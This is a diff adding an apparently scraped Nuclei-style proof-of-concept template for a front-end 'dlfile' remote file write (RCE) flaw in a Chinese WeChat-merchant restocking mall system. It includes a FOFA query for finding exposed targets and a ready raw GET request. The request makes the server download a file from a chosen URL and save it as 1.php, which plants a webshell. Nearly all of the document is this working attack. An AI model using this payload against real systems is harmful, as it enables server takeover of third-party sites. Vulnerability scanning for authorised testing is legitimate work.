@@ -1,0 +1,53 @@
+id: poc-dn0znd8g3e0f947z
+info:
+  name: 微商代理商补货商城系统存在前台dlfile远程文件写入漏洞(RCE)
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dn0znd8g3e0f947z'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dn0znd8g3e0f947z
+    fofa: '"/template/mobile/new/static/assets/js/comm.js"'
+http:
+- raw:
+  - 'GET /home/test/dlfile?file_url=http://127.0.0.1/111.txt&save_to=1.php HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: no-cache
+
+    Connection: keep-alive
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-User: ?1
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+
+    sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    文件写入到https://ip/1.php中'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
